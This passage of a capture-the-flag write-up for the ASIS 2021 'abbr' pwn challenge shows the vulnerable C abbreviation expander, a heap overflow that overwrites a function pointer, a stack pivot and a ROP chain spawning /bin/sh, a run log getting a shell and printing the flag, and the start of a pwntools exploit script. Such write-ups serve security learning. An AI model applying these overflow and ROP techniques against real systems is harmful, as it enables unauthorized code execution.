+</span><span style="color:#6272a4"></span>        end <span style="color:#ff79c6">+=</span> blen<span style="color:#ff79c6">-</span>alen;
+        <span style="color:#ff79c6">*</span>(end<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;\0&#39;</span>;
+        <span style="color:#6272a4">// i.e &#34;i&#39;m pwn XXnoob.&#34; --&gt; &#34;i&#39;m pwn newbie.&#34;
+</span><span style="color:#6272a4"></span>        memcpy(p, r<span style="color:#ff79c6">-&gt;</span>b, blen);
+      }
+    }
+  }
+}
+
+Translator <span style="color:#ff79c6">*</span><span style="color:#50fa7b">translator_new</span>(<span style="color:#8be9fd">int</span> size) {
+  Translator <span style="color:#ff79c6">*</span>t;
+
+  <span style="color:#6272a4">/* Allocate region for text */</span>
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>text <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)calloc(<span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">char</span>), size);
+  <span style="color:#ff79c6">if</span> (text <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
+    <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
+
+  <span style="color:#6272a4">/* Initialize translator */</span>
+  t <span style="color:#ff79c6">=</span> (Translator<span style="color:#ff79c6">*</span>)malloc(<span style="color:#ff79c6">sizeof</span>(Translator));
+  t<span style="color:#ff79c6">-&gt;</span>text <span style="color:#ff79c6">=</span> text;
+  t<span style="color:#ff79c6">-&gt;</span>size <span style="color:#ff79c6">=</span> size;
+  t<span style="color:#ff79c6">-&gt;</span>translate <span style="color:#ff79c6">=</span> english_expand;
+
+  <span style="color:#ff79c6">return</span> t;
+}
+
+<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">translator_reset</span>(Translator <span style="color:#ff79c6">*</span>t) {
+  memset(t<span style="color:#ff79c6">-&gt;</span>text, <span style="color:#bd93f9">0</span>, t<span style="color:#ff79c6">-&gt;</span>size);
+}
+
+<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
+  setvbuf(stdin, <span style="color:#8be9fd;font-style:italic">NULL</span>, _IONBF, <span style="color:#bd93f9">0</span>);
+  setvbuf(stdout, <span style="color:#8be9fd;font-style:italic">NULL</span>, _IONBF, <span style="color:#bd93f9">0</span>);
+  alarm(<span style="color:#bd93f9">60</span>);
+
+  Translator <span style="color:#ff79c6">*</span>t <span style="color:#ff79c6">=</span> translator_new(<span style="color:#bd93f9">0x1000</span>);
+  <span style="color:#ff79c6">while</span> (<span style="color:#bd93f9">1</span>) {
+    <span style="color:#6272a4">/* Input data */</span>
+    translator_reset(t);
+    printf(<span style="color:#f1fa8c">&#34;Enter text: &#34;</span>);
+    fgets(t<span style="color:#ff79c6">-&gt;</span>text, t<span style="color:#ff79c6">-&gt;</span>size, stdin);
+    <span style="color:#ff79c6">if</span> (t<span style="color:#ff79c6">-&gt;</span>text[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;\n&#39;</span>)
+      <span style="color:#ff79c6">break</span>;
+
+    <span style="color:#6272a4">/* Expand abbreviation */</span>
+    t<span style="color:#ff79c6">-&gt;</span>translate(t<span style="color:#ff79c6">-&gt;</span>text);
+    printf(<span style="color:#f1fa8c">&#34;Result: %s&#34;</span>, t<span style="color:#ff79c6">-&gt;</span>text);
+  }
+
+  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+}
+</code></pre></div><p>The <code>rules.h</code> looks like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> {
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>a; <span style="color:#6272a4">// abbreviated string (i.e &#34;asap&#34;)
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>b; <span style="color:#6272a4">// expanded string (i.e &#34;as soon as possible&#34;)
+</span><span style="color:#6272a4"></span>} Rule;
+
+<span style="color:#6272a4">// Why are there so many abbreviations in English!!?? :exploding_head:
+</span><span style="color:#6272a4"></span>Rule rules[] <span style="color:#ff79c6">=</span>
+  {
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;2f4u&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;too fast for you&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;4yeo&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;for your eyes only&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;fyeo&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;for your eyes only&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;aamof&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;as a matter of fact&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;afaik&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;as far as i know&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;afk&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;away from keyboard&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;aka&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;also known as&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;b2k&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;back to keyboard&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;btk&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;back to keyboard&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;btt&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;back to topic&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;btw&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;by the way&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;b/c&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;because&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;c&amp;p&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;copy and paste&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;cys&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;check your settings&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;diy&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;do it yourself&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;eobd&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;end of business day&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;faq&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;frequently asked questions&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;fka&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;formerly known as&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;fwiw&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;for what it&#39;s worth&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;fyi&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;for your information&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;jfyi&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;just for your information&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;hf&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;have fun&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;hth&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;hope this helps&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;idk&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;i don&#39;t know&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;iirc&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;if i remember correctly&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;imho&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;in my humble opinion&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;imo&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;in my opinion&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;imnsho&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;in my not so humble opinion&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;iow&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;in other words&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;itt&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;in this thread&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;dgmw&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;don&#39;t get me wrong&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;mmw&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;mark my words&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nntr&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;no need to reply&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;noob&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;newbie&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;noyb&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;none of your business&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nrn&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;no reply necessary&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;otoh&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;on the other hand&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;rtfm&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;read the fine manual&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;scnr&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sorry, could not resist&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sflr&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sorry for late reply&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;tba&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;to be announced&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;tbc&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;to be continued&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;tia&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;thanks in advance&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;tq&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;thank you&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;tyvm&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;thank you very much&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;tyt&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;take your time&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;ttyl&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;talk to you later&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;wfm&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;works for me&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;wtf&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;what the fuck&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;wrt&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;with regard to&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;ymmd&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;you made my day&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;icymi&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;in case you missed it&#34;</span>},
+   <span style="color:#6272a4">// pwners abbreviations
+</span><span style="color:#6272a4"></span>   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;rop &#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;return oriented programming &#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;jop &#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;jump oriented programming &#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;cop &#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;call oriented programming &#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;aar&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;arbitrary address read&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;aaw&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;arbitrary address write&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;www&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;write what where&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;oob&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;out of bounds&#34;</span>},
+   {.a<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;ret2&#34;</span>, .b<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;return to &#34;</span>},
+  };
+</code></pre></div><p>The main stuff is in <code>english_expand</code> function which is looking for an abreviation in the user input. If it finds the abbreviation, all the data after the occurence will be written further according to the length of the full expression.
+The attack idea is fairly simple, the <code>text</code> variable is allocated right before the <code>Translator</code> structure, and so in the heap they will be contiguous. Given that, we know that if we send 0x1000 bytes in the chunk contained by <code>text</code> and that we put an abbreviation of the right length we can overwrite the <code>translate</code> function pointer.</p>
+<p>I will not describe in details how we can find the right size for the abbreviation or the length off the necessary padding.
+An interesting abbreviation is the <code>www</code>, which stands for &ldquo;write what where&rdquo; (what a nice abbreviation for a pwner lmao), indeed the expanded expression has a length of 16 bytes.
+So we send <code>b&quot;wwwwww&quot; + b&quot;A&quot;*(0x1000-16) + pwn.p64(gadget)</code>, we will overflow the 32 first bytes next the <code>text</code> chunk, and in this rewrite the <code>translator</code> function pointer.</p>
+<h2 id="ropchain-1">ROPchain</h2>
+<p>Once that&rsquo;s done, when the function pointer will be triggered at the next iteration, we will be able to jmp at an arbitrary location.
+Lets take a look at the values of the registers when we trigger the function pointer:</p>
+<pre><code> RAX  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
+ RBX  0x400530 (_IO_getdelim.cold+29) ◂— 0x0
+ RCX  0x459e62 (read+18) ◂— cmp    rax, -0x1000 /* 'H=' */
+*RDX  0x405121 (_nl_load_domain+737) ◂— xchg   eax, esp
+ RDI  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
+ RSI  0x4c9943 (_IO_2_1_stdin_+131) ◂— 0x4cc020000000000a /* '\n' */
+ R8   0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
+ R9   0x0
+ R10  0x49e522 ◂— 'Enter text: '
+ R11  0x246
+ R12  0x4030e0 (__libc_csu_fini) ◂— endbr64 
+ R13  0x0
+ R14  0x4c9018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x44fd90 (__strcpy_avx2) ◂— endbr64 
+ R15  0x0
+ RBP  0x7ffdef1b8230 —▸ 0x403040 (__libc_csu_init) ◂— endbr64 
+ RSP  0x7ffdef1b8220 ◂— 0x0
+ RIP  0x402036 (main+190) ◂— call   rdx
+</code></pre><p><code>$rax</code> points to the newly readen input, same for <code>$r8</code> and <code>$rdi</code> and <code>$rdx</code> contains the location to which we will jmp on.
+So we can search gadgets like <code>mov rsp, rax</code>, <code>mov rsp, rdi</code>, <code>mov rsp, r8</code> and so on. But I didn&rsquo;t find any gadgets like that, so I looked for <code>xchg rsp</code> gadgets, and I finally found a <code>xchg eax, esp</code> gadgets ! Since the binary is not PIE based, the heap addresses fit into a 32 bits register, so that&rsquo;s perfect!</p>
+<p>Now we can make <code>$rsp</code> to point to the user input, we make a similar ropchain as the last challenge, and that&rsquo;s enough to get a shell!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">
+<span style="color:#6272a4"># 0x00000000004126e3 : call qword ptr [rax]</span>
+<span style="color:#6272a4"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span>
+<span style="color:#6272a4"># 0x0000000000405121 : xchg eax, esp ; ret</span>
+
+pld <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;wwwwww&#34;</span>
+pld <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">0x1000</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x0000000000405121</span>)
+io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;Enter text: &#34;</span>, pld)
+
+<span style="color:#6272a4"># 0x000000000045a8f7 : pop rax ; ret</span>
+<span style="color:#6272a4"># 0x0000000000404cfe : pop rsi ; ret</span>
+<span style="color:#6272a4"># 0x00000000004018da : pop rdi ; ret</span>
+<span style="color:#6272a4"># 0x00000000004017df : pop rdx ; ret</span>
+<span style="color:#6272a4"># 0x000000000045684f : mov qword ptr [rdi], rsi ; ret</span>
+
+DATA_SEC <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000004c90e0</span>
+POP_RDI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000004018da</span>
+POP_RSI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000404cfe</span>
+POP_RAX <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x000000000045a8f7</span>
+POP_RDX <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000004017df</span>
+MOV_PTR_RDI_RSI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x000000000045684f</span>
+SYSCALL <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000004012e3</span> <span style="color:#6272a4"># syscall</span>
+
+pld <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDI)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(DATA_SEC)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RSI)
+pld <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(MOV_PTR_RDI_RSI)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RSI)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x0</span>)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDX)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x0</span>)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RAX)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x3b</span>)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(SYSCALL)
+</code></pre></div><p>We launch the script with the right arguments and we correctly pop a shell!</p>
+<pre><code>➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 
+[*] '/home/nasm/pwn/asis2021/abbr.d/abbr'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to 168.119.108.148 on port 10010: Done
+/home/nasm/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  res = self.recvuntil(delim, timeout=timeout)
+[*] Switching to interactive mode
+$ id
+uid=999(pwn) gid=999(pwn) groups=999(pwn)
+$ ls
+chall
+flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
+$ cat flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
+ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
+</code></pre><h2 id="final-exploit">Final exploit</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4">#!/usr/bin/env python</span>
+<span style="color:#6272a4"># -*- coding: utf-8 -*-</span>
+
+<span style="color:#6272a4"># this exploit was generated via</span>
+<span style="color:#6272a4"># 1) pwntools</span>
+<span style="color:#6272a4"># 2) ctfinit</span>
+
+<span style="color:#ff79c6">import</span> os
+<span style="color:#ff79c6">import</span> time
+<span style="color:#ff79c6">import</span> pwn
+
+
+<span style="color:#6272a4"># Set up pwntools for the correct architecture</span>
+exe  <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(<span style="color:#f1fa8c">&#39;abbr&#39;</span>)
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>delete_corefiles <span style="color:#ff79c6">=</span> True
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>rename_corefiles <span style="color:#ff79c6">=</span> False
+
+host <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>HOST <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>
+port <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>PORT <span style="color:#ff79c6">or</span> <span style="color:#bd93f9">1337</span>)
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">local</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>debug([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, gdbscript<span style="color:#ff79c6">=</span>gdbscript, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+    <span style="color:#ff79c6">else</span>:
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>process([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">remote</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
+    io <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>connect(host, port)
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
+        pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>attach(io, gdbscript<span style="color:#ff79c6">=</span>gdbscript)
+    <span style="color:#ff79c6">return</span> io
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">start</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>LOCAL:
+        <span style="color:#ff79c6">return</span> local(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+    <span style="color:#ff79c6">else</span>:
+        <span style="color:#ff79c6">return</span> remote(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+
+gdbscript <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;&#39;
+</span><span style="color:#f1fa8c">source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py
+</span><span style="color:#f1fa8c">b* 0x402036
+</span><span style="color:#f1fa8c">continue
+</span><span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#ff79c6">.</span>format(<span style="color:#ff79c6">**</span><span style="color:#8be9fd;font-style:italic">locals</span>())
+
+<span style="color:#6272a4">#===========================================================</span>
+<span style="color:#6272a4">#                    EXPLOIT GOES HERE</span>
+<span style="color:#6272a4">#===========================================================</span>
+
+io <span style="color:#ff79c6">=</span> start()
+
+<span style="color:#6272a4"># 000000000048ac90    80 FUNC    GLOBAL DEFAULT    7 _dl_make_stack_executable</span>
+<span style="color:#6272a4"># 0x0000000000422930 : add rsp, 0x10 ; pop rbp ; ret</span>
+
+<span style="color:#6272a4"># 0x00000000004126e3 : call qword ptr [rax]</span>
+<span style="color:#6272a4"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span>
+<span style="color:#6272a4"># 0x0000000000405121 : xchg eax, esp ; ret</span>
+
+pld <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;wwwwww&#34;</span>
